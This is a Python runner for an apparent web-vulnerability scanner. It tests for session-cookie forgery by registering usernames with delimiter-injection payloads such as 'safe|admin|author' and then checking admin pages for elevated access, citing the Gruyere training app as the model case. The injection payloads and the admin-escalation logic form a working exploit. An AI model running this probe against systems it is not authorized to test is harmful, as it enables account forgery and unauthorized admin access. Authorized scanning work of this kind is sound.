"""cookie-tamper-probe — detects identity-token injection via input fields.

Apps that build session cookies by concatenating user-controlled strings
without escaping are vulnerable to a forging attack: an attacker registers
a username like `foo|admin|author` and gets a cookie that, when parsed,
claims they're admin. This runner registers users with delimiter-injection
patterns and verifies the resulting session grants admin context.

Gruyere R2 is the canonical example: usernames containing `|` break the
cookie format because the cookie is `<id>|<user>|<is_admin>|<is_author>`.

Strategy:
1. Pick the target's registration endpoint (heuristic + Gruyere prefab).
2. For each common cookie-delimiter (|, :, ;, ,, $, NULL), register
   with a payload `safe<DELIM>admin<DELIM>author`.
3. Check if the resulting session grants admin context via known admin
   verify endpoints.
4. CRITICAL finding per successful tampering.
"""
from __future__ import annotations

import json
import logging
import random
import string
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution

logger = logging.getLogger(__name__)

RUNNER_NAME = "cookie-tamper-probe"
RESULTS_ARTIFACT_NAME = "cookie-tamper-results.json"
DEFAULT_TIMEOUT = 12.0

REGISTER_ENDPOINTS: tuple[str, ...] = (
    "saveprofile",
    "register",
    "signup",
    "api/register",
)

# Delimiters commonly used inside session cookies / tokens.
DELIMITERS: tuple[tuple[str, str], ...] = (
    ("pipe", "|"),
    ("colon", ":"),
    ("semicolon", ";"),
    ("comma", ","),
    ("dollar", "$"),
    ("null_byte", "\x00"),
)

# Tail tokens to inject after the delimiter. Each token = (label, payload).
INJECTION_TAILS: tuple[tuple[str, str], ...] = (
    ("admin_flag", "admin"),
    ("admin_author", "admin{D}author"),
    ("admin_True", "admin{D}True{D}True"),
)

ADMIN_VERIFY_ENDPOINTS: tuple[str, ...] = (
    "manage.gtl",
    "manage",
    "admin",
    "admin/users",
    "",  # home page
)

ADMIN_INDICATORS: tuple[str, ...] = (
    "manage this server",
    "admin-only",
    "all users",
    "delete user",
    "administrator panel",
    "manage users",
)


def _artifact(payload: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=RESULTS_ARTIFACT_NAME,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _suffix() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def _path_root(target: str) -> str:
    parsed = urlparse(target)
    if not parsed.path or parsed.path == "/":
        return target.rstrip("/") + "/"
    if not parsed.path.endswith("/"):
        return target.rsplit("/", 1)[0] + "/"
    return target


def _check_admin_access(client: httpx_client.Client, base: str) -> tuple[bool, str, str]:
    for path in ADMIN_VERIFY_ENDPOINTS:
        url = urljoin(base, path)
        try:
            resp = client.get(url, follow_redirects=False)
        except httpx_client.RequestError:
            continue
        body_lower = (resp.text or "").lower()[:8192]
        if resp.status_code == 200 and any(ind in body_lower for ind in ADMIN_INDICATORS):
            return True, url, (resp.text or "")[:300]
    return False, "", ""


def execute_cookie_tamper_probe(
    targets: list[str] | list[dict[str, Any]],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    timeout_seconds: float = DEFAULT_TIMEOUT,
) -> RunnerExecution:
    findings_payload: list[dict[str, Any]] = []
    trace: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    web_targets: list[str] = []
    for t in targets:
        if isinstance(t, str):
            if t.strip().lower().startswith(("http://", "https://")):
                web_targets.append(t.strip())
        elif isinstance(t, dict):
            kind = str(t.get("kind") or "").lower()
            value = str(t.get("value") or "").strip()
            if kind == "url" and value:
                web_targets.append(value)
    if not web_targets:
        return RunnerExecution(
            tool=RUNNER_NAME, exit_code=2, stdout=json.dumps({"trace": []}),
            stderr="no web targets supplied",
            metadata={"status": "skip"},
            artifacts=[_artifact({"trace": []})], protected_outputs=[],
        )

    for target in web_targets:
        base = _path_root(target)
        trace_entry: dict[str, Any] = {"target": target, "base": base, "attempts": []}
        done = False
        for endpoint in REGISTER_ENDPOINTS:
            if done:
                break
            url = urljoin(base, endpoint)
            if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, url):
                continue
            for delim_name, delim_char in DELIMITERS:
                if done:
                    break
                for tail_label, tail_template in INJECTION_TAILS:
                    tail = tail_template.format(D=delim_char)
                    payload_uid = f"sx{_suffix()}{delim_char}{tail}"
                    pw = f"pw{_suffix()}"
                    with httpx_client.Client(timeout=timeout_seconds, follow_redirects=False) as client:
                        params = {"action": "new", "uid": payload_uid, "pw": pw}
                        try:
                            resp = client.get(url, params=params, follow_redirects=False)
                        except httpx_client.RequestError:
                            continue
                        if resp.status_code not in (200, 302):
                            continue
                        if len(client.cookies) == 0:
                            # Try logging in as the same payload-user
                            try:
                                client.get(urljoin(base, "login"), params={"uid": payload_uid, "pw": pw})
                            except httpx_client.RequestError:
                                pass
                        if len(client.cookies) == 0:
                            continue
                        is_admin, admin_url, evidence = _check_admin_access(client, base)
                        cookie_dump = {k: v for k, v in client.cookies.items()}
                        trace_entry["attempts"].append({
                            "endpoint": url,
                            "delimiter": delim_name,
                            "tail_label": tail_label,
                            "uid_payload": payload_uid,
                            "status": resp.status_code,
                            "cookie_snapshot": cookie_dump,
                            "is_admin_after": is_admin,
                        })
                        if is_admin:
                            findings_payload.append({
                                "title": f"Identity Forgery via {delim_name.title()}-Delimiter Injection in Username",
                                "severity": "critical",
                                "category": "authentication",
                                "target_id": url,
                                "evidence": {
                                    "endpoint": url,
                                    "delimiter": delim_char,
                                    "injection_pattern": payload_uid,
                                    "resulting_cookie": cookie_dump,
                                    "admin_endpoint_reachable": admin_url,
                                    "admin_response_excerpt": evidence,
                                },
                            })
                            stderr_lines.append(
                                f"CRITICAL: {delim_name} injection in {url} → admin context"
                            )
                            done = True
                            break
        trace.append(trace_entry)

    result = {"trace": trace, "findings": findings_payload, "attempt_count": sum(len(t["attempts"]) for t in trace)}
    if findings_payload:
        stderr_lines.append(f"flagged {len(findings_payload)} identity-forgery finding(s)")

    return RunnerExecution(
        tool=RUNNER_NAME,
        exit_code=0,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={
            "status": "ok",
            "tool_version": f"{RUNNER_NAME}:v1",
            "findings_count": len(findings_payload),
        },
        artifacts=[_artifact(result)],
        protected_outputs=[],
    )
